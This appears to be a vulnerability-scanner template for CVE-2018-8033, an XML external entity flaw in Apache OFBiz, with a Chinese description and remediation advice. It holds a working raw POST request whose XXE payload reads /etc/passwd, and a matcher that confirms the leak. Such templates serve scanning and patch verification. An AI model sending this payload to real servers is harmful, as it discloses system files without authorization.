id: CVE-2018-8033
info:
  name: Apache OFBiz XXE
  author:
  - l0ne1y
  description: |-
    Apache OFBiz HttpEngine XML外部实体安全漏洞
    在Apache OFBiz 16.11.01到16.11.04中，OFBiz HTTP引擎（`org.apache.ofbiz.service.engine.HttpEngine.java`）通过/ webtools / control / httpService端点处理对HTTP服务的请求。对httpService端点的POST和GET请求都可能包含三个参数：serviceName，serviceMode和serviceContext。通过使DOCTYPE指向外部引用来触发从主机返回秘密信息的有效负载，从而实现利用
  severity: high
  remediation: |
    **官方修复方案**
    目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    [https://lists.apache.org/thread.html/e8fb551e86e901932081f81ee9985bb72052b4d412f23d89b1282777@%3Cuser.ofbiz.apache.org%3E](https://lists.apache.org/thread.html/e8fb551e86e901932081f81ee9985bb72052b4d412f23d89b1282777@%3Cuser.ofbiz.apache.org%3E)
    **临时修复方案**
    1、禁用外部实体
    2、过滤用户提交的XML数据，关键词：<!DOCTYPE和<!ENTITY，或者，SYSTEM和PUBLIC
requests:
- matchers:
  - type: regex
    part: body
    regex:
    - 'root:.*:0:0:'
  - type: status
    status:
    - 200
  matchers-condition: and
  raw:
  - |
    POST /webtools/control/xmlrpc HTTP/1.1
    Host: {{Hostname}}
    Accept: */*
    Accept-Language: en
    Content-Type: application/xml

    <?xml version="1.0"?><!DOCTYPE x [<!ENTITY disclose SYSTEM "file://///etc/passwd">]><methodCall><methodName>&disclose;</methodName></methodCall>
